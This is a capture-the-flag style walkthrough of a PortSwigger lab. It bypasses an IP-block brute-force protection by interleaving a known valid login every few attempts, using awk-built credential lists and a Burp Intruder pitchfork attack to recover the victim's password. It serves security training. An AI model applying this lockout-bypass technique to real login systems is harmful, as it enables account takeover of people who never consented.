# Lab: Broken brute-force protection, IP block

### Instructions

This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

- Your credentials: wiener:peter
- Victim's username: carlos
- Candidate passwords - https://portswigger.net/web-security/authentication/auth-lab-passwords

### Solution

Manually trying the credentials `test:test`, we find our IP is blocked after 3 attempts, and we get the message:

```
You have made too many incorrect login attempts. Please try again in 1 minute(s). 
```
We have been provided the working credentials for user wiener, and the goal here, based on the lockout policy, is to insert a set of working credentials every 3 attempts in our brute force process in order to prevent lockout via IP blocking.

We can first make some updated files.

We can use `awk` to create a new password list, inserting the valid password for wiener "peter" at the beginning and after every three lines:

```bash
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Authentication/Auth_06_flawed_brute-force_protection_ip_block]
└─$ awk 'BEGIN {print "peter"} 1; NR % 2 == 0 {print "peter"}' ../candidate_passwords.txt > modified_passwords.txt
                                                                                                                                       
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Authentication/Auth_06_flawed_brute-force_protection_ip_block]
└─$ head modified_passwords.txt 
peter
123456
password
peter
12345678
qwerty
peter
123456789
12345
peter
```

With this complete we can create a users.txt file, which will correspond to our password file:

```bash
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Authentication/Auth_06_flawed_brute-force_protection_ip_block]
└─$ awk 'NR % 3 == 1 {print "wiener"; next} {print "carlos"}' <(seq $(wc -l < modified_passwords.txt)) > users.txt
                                                                                                                                       
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Authentication/Auth_06_flawed_brute-force_protection_ip_block]
└─$ head users.txt             
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
```

Now we can capture a login request in Burp, send it to Intruder, and use a Pitchfork attack.


Filtering by 302 status codes we find a valid password for carlos:

```
73	wiener	peter	302	332	false	false	188	
75	carlos	robert	302	338	false	false	188	
76	wiener	peter	302	331	false	false	188	
```

We can then login to the app using `carlos:robert` and complete the lab.